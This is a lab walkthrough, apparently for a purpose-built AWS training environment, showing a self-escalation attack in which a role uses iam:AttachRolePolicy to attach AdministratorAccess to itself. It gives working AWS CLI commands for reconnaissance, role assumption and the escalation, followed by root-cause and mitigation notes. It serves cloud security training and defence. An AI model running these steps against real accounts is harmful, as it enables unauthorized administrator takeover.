# Guided Walkthrough: Self-Escalation Privilege Escalation via iam:AttachRolePolicy

This scenario demonstrates a privilege escalation vulnerability where a role can attach managed policies to itself using `iam:AttachRolePolicy`. The attacker starts with minimal permissions but can grant themselves administrator access by attaching the AWS-managed `AdministratorAccess` policy to their own role.

This class of vulnerability is surprisingly common in real environments. Developers or automation systems often receive `iam:AttachRolePolicy` to manage their own configurations, without realizing that scoping it to their own role's ARN creates a direct self-escalation path. All an attacker needs is to know the role name and the ARN of any high-privilege managed policy — both trivially discoverable.

What makes this particularly dangerous is the immediacy of the escalation. Unlike techniques that require creating new resources or waiting for approval workflows, attaching a policy takes effect within seconds. There are no additional principals to compromise and no infrastructure to spin up.

## The Challenge

You start with credentials for `pl-prod-iam-009-to-admin-starting-user`. This IAM user has permission to assume the role `pl-prod-iam-009-to-admin-starting-role`. That role, in turn, holds an `iam:AttachRolePolicy` permission scoped specifically to itself.

Your goal is to reach effective administrator access. The path runs through the role's ability to modify its own policy attachments.

The Terraform-created resources are:
- Starting user: `arn:aws:iam::{account_id}:user/pl-prod-iam-009-to-admin-starting-user`
- Starting role: `arn:aws:iam::{account_id}:role/pl-prod-iam-009-to-admin-starting-role`
- Custom policy: `arn:aws:iam::{account_id}:policy/pl-prod-iam-009-to-admin-policy` (grants `iam:AttachRolePolicy` on the role itself)

## Reconnaissance

First, let's establish who you are and what you can see from the starting user:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

This confirms you're operating as `pl-prod-iam-009-to-admin-starting-user`. Now let's look at what roles this user can assume:

```bash
aws iam list-attached-user-policies --user-name pl-prod-iam-009-to-admin-starting-user
aws iam list-user-policies --user-name pl-prod-iam-009-to-admin-starting-user
```

You'll find the user has an inline or attached policy that allows `sts:AssumeRole` on the starting role. Let's also examine what permissions the role itself has before assuming it:

```bash
aws iam list-attached-role-policies --role-name pl-prod-iam-009-to-admin-starting-role
aws iam list-role-policies --role-name pl-prod-iam-009-to-admin-starting-role
```

This reveals the custom policy attached to the role. Inspecting it shows `iam:AttachRolePolicy` scoped to the role's own ARN — that's your escalation path.

## Exploitation

With the reconnaissance done, the exploit is two steps.

**Step 1: Assume the starting role.**

```bash
ASSUME_OUTPUT=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-iam-009-to-admin-starting-role" \
  --role-session-name "escalation-session")

export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SessionToken')
```

You're now operating as the starting role. Confirm the identity:

```bash
aws sts get-caller-identity
```

Try listing IAM users to confirm you don't yet have admin access:

```bash
aws iam list-users --max-items 1
# Expected: AccessDenied
```

**Step 2: Attach `AdministratorAccess` to yourself.**

The role has `iam:AttachRolePolicy` on its own ARN. Use it to attach the AWS-managed `AdministratorAccess` policy:

```bash
aws iam attach-role-policy \
  --role-name "pl-prod-iam-009-to-admin-starting-role" \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

That's the entire exploit. One API call.

## Verification

IAM policy changes propagate quickly but not instantly. Wait 15 seconds, then verify:

```bash
sleep 15

# Confirm the policy is attached
aws iam list-attached-role-policies \
  --role-name pl-prod-iam-009-to-admin-starting-role \
  --query 'AttachedPolicies[*].PolicyArn' \
  --output text
```

You should see `arn:aws:iam::aws:policy/AdministratorAccess` in the output. Now test admin access directly:

```bash
aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text
```

This should succeed. You now have full administrator access operating as `pl-prod-iam-009-to-admin-starting-role`.

## What Happened

The attack chain was: `pl-prod-iam-009-to-admin-starting-user` → (sts:AssumeRole) → `pl-prod-iam-009-to-admin-starting-role` → (iam:AttachRolePolicy on self) → effective administrator.

The root cause is that `iam:AttachRolePolicy` was granted with a resource condition pointing to the role's own ARN. From a least-privilege perspective this looks scoped — the role can only modify itself. But that's precisely what makes it dangerous: the role can elevate its own permissions without any other principal's involvement. A permission boundary or SCP blocking attachment of `AdministratorAccess` would have broken this chain entirely.

In real environments this pattern appears when a role is given permission to manage its own configuration (e.g., for self-service infrastructure), without considering that policy attachment is a privileged operation regardless of which role is being modified.
